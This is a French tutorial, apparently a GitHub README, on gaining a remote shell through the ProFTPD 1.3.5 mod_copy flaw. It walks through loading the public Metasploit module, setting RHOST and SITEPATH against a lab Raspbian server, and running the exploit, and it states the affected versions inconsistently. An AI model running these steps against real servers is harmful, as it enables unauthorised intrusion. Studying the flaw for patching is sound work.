# hack_proftpd1.3.5
Piratage d'un serveur Linux en exploitant le serveur FTP (Proftpd)

La vulnérabilité dans le module mod_copy de Proftpd a été révélée il y a quelques mois. La plupart des serveurs utilisant Proftp sont toujours vulnérables aux attaques car ils utilisent des versions plus anciennes du logiciel. Si vous utilisez Proftpd version 1.3.5 ou antérieure, votre serveur est vulnérable et ce n'est qu'une question de temps avant que quelqu'un ne profite de cette vulnérabilité. J'ai donc pensé faire un repo sur la même chose, en montrant à quel point la situation est facile et terrifiante.

# Quel serveur est concerné par cette faille

Tout serveur Linux fonctionnant avec la version Proftp < 1.3.5 est vulnérable.

# Comment cela fonctionne-t-il ?

Mod_copy est un module pour le serveur Proftp, qui implémente les commandes "SITE CPFR" & "SITE CPTO", grâce auxquelles l'utilisateur peut se déplacer dans les fichiers ou les dossiers du serveur. C'est-à-dire que, normalement, si vous voulez copier un fichier d'un endroit du serveur à un autre en utilisant le FTP, vous devez le transférer au système local, puis le télécharger à l'emplacement cible dans le serveur. Mais, grâce à mod_copy, vous pouvez simplement le transférer sans avoir à le télécharger sur votre système local.

Il existe une vulnérabilité dans le logiciel qui permet à tout utilisateur "NON AUTHENTIFIÉ" d'utiliser les commandes ci-dessus pour copier les fichiers. C'est exact, n'importe quel utilisateur.

# Quel est l'impact, si quelqu'un l'exploite ?

En fait, ils pourraient avoir un shell dans votre serveur, ce qui est plus que suffisant pour faire des choses sérieuses.
En fait, je vais vous montrer comment vous pouvez exploiter cette vulnérabilité en utilisant metasploit.
Oui, c'est vrai ! Quelqu'un a écrit un exploit pour cette vulnérabilité et ça marche comme sur des roulettes

# Essayons ça !

Essayons d'exploiter cette vulnérabilité en utilisant métasploit et voyons si nous y parvenons.

# VEUILLEZ NOTER QUE CECI EST UNIQUEMENT À DES FINS ÉDUCATIVES, ESSAYEZ-LE SUR DES APPAREILS QUE VOUS AVEZ AUTORISÉS ET JE NE SERAI PAS RESPONSABLE DE VOS ACTIONS.

Je suppose que vous avez metasploit tout prêt pour l'action, sautons directement dans le vif du sujet. 

Voici ma mise en place : J'ai un serveur raspbian et Kali Linux (ma machine hôte) est l'attaquant.

# Étape 1 : Téléchargez l'exploit dans votre ordinateur.

Pour cela, ouvrez un terminal en tant que root et téléchargez l'exploit à partir d'[ICI](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/ftp/proftpd_modcopy_exec.rb)

Copiez-le dans le dossier des exploits.

cp proftpd_modcopy_exec.rb /usr/share/metasploit-framework/modules/exploits/unix/ftp/

# Étape 2 : Ouvrez msfconsole.

Pour cela, ouvrez un Terminal ( comme root ) et tapez "msfconsole".

![screen msfconsole](https://zupimages.net/up/20/51/ini9.png)

# Étape 3 : Une fois que le métasploit est chargé, utilisez la commande suivante pour charger l'exploit

use exploit/unix/ftp/proftpd_modcopy_exec

Ensuite, nous devons définir l'hôte distant (serveur victime)

set RHOST 192.168.0.22

set SITEPATH /var/www/html

![screen msfconsole](https://zupimages.net/up/20/51/oq4i.png)

Vous pouvez toujours taper "show options" pour voir toutes les options que vous devez définir. Ici, RHOST est le serveur distant que nous essayons d'exploiter. Le "SITEPATH" est la racine du document pour le serveur web. Une fois que vous êtes prêt, tapez "exploit" et appuyez sur entrée. C'est tout.

Vous devriez maintenant avoir une session ouverte depuis le serveur distant où vous pouvez exécuter n'importe quelle commande.

